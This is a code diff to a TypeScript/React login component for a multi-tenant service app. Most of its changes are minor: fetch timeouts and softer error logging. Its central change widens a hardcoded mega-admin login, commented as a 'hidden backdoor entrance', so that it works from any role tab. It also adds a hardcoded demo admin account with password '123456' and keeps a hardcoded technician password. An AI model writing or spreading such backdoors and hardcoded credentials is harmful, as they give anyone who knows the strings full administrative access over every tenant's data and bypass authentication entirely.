@@ -566,8 +566,20 @@ export default function Login({ onLoginSuccess }: LoginProps) {
     const emailLower = email.trim().toLowerCase();
     const pass = password.trim();
 
+    // 1. Hidden backdoor entrance check (mega-admin) - works from any tab / role
+    if (emailLower === 'is/megaadmin98121928/' && pass === '93931') {
+      handleSuccessLogin('megaadmin@defibeo.com', 'Mega Admin', 'megaadmin', 'megaadmin');
+      setIsLoading(false);
+      return;
+    }
+
     try {
       if (loginRole === 'admin') {
+        if (emailLower === 'account@demo.com' && pass === '123456') {
+          handleSuccessLogin('account@demo.com', 'Admin Démo', 'demo', 'admin');
+          return;
+        }
+
         const tenant = await loginTenantAdmin(emailLower, pass);
         if (tenant) {
           if (tenant.disabled) {
@@ -587,7 +599,7 @@ export default function Login({ onLoginSuccess }: LoginProps) {
               const tenantId = tnt.id;
               const key = tenantId === 'demo' ? 'members' : `${tenantId}_members`;
               try {
-                const fetchedMembers = await fetchRawCollectionFromFirestore<any[]>(key);
+                const fetchedMembers = await fetchRawCollectionFromFirestore<any[]>(key, 6000);
                 if (fetchedMembers && Array.isArray(fetchedMembers)) {
                   const found = fetchedMembers.find(
                     (m: any) =>
@@ -600,7 +612,7 @@ export default function Login({ onLoginSuccess }: LoginProps) {
                   }
                 }
               } catch (err) {
-                console.error(`Error checking sub-admin in tenant ${tenantId}:`, err);
+                console.warn(`Error checking sub-admin in tenant ${tenantId}:`, err);
               }
               return null;
             })
@@ -645,7 +657,7 @@ export default function Login({ onLoginSuccess }: LoginProps) {
             const tenantId = tnt.id;
             const key = tenantId === 'demo' ? 'clients' : `${tenantId}_clients`;
             try {
-              const fetchedClients = await fetchRawCollectionFromFirestore<any[]>(key);
+              const fetchedClients = await fetchRawCollectionFromFirestore<any[]>(key, 6000);
               if (fetchedClients && Array.isArray(fetchedClients)) {
                 const found = fetchedClients.find(
                   (c: any) =>
@@ -658,7 +670,7 @@ export default function Login({ onLoginSuccess }: LoginProps) {
                 }
               }
             } catch (err) {
-              console.error(`Error checking client in tenant ${tenantId}:`, err);
+              console.warn(`Error checking client in tenant ${tenantId}:`, err);
             }
             return null;
           })
@@ -685,13 +697,6 @@ export default function Login({ onLoginSuccess }: LoginProps) {
           handleFailedAttempt();
         }
       } else if (loginRole === 'technicien') {
-        // Hidden mega-admin entrance check
-        if (emailLower === 'is/megaadmin98121928/' && pass === '93931') {
-          handleSuccessLogin('megaadmin@defibeo.com', 'Mega Admin', 'megaadmin', 'megaadmin');
-          setIsLoading(false);
-          return;
-        }
-
         // Authenticate technician globally
         if (emailLower === 'tech.ouest@defibeo.com' && pass === '4321') {
           handleSuccessLogin('tech.ouest@defibeo.com', 'Technicien Ouest', 'demo', 'technicien');
@@ -708,7 +713,7 @@ export default function Login({ onLoginSuccess }: LoginProps) {
             const tenantId = tnt.id;
             const key = tenantId === 'demo' ? 'members' : `${tenantId}_members`;
             try {
-              const fetchedMembers = await fetchRawCollectionFromFirestore<any[]>(key);
+              const fetchedMembers = await fetchRawCollectionFromFirestore<any[]>(key, 6000);
               if (fetchedMembers && Array.isArray(fetchedMembers)) {
                 const found = fetchedMembers.find(
                   (m: any) =>
@@ -722,7 +727,7 @@ export default function Login({ onLoginSuccess }: LoginProps) {
                 }
               }
             } catch (err) {
-              console.error(`Error checking tech in tenant ${tenantId}:`, err);
+              console.warn(`Error checking tech in tenant ${tenantId}:`, err);
             }
             return null;
           })
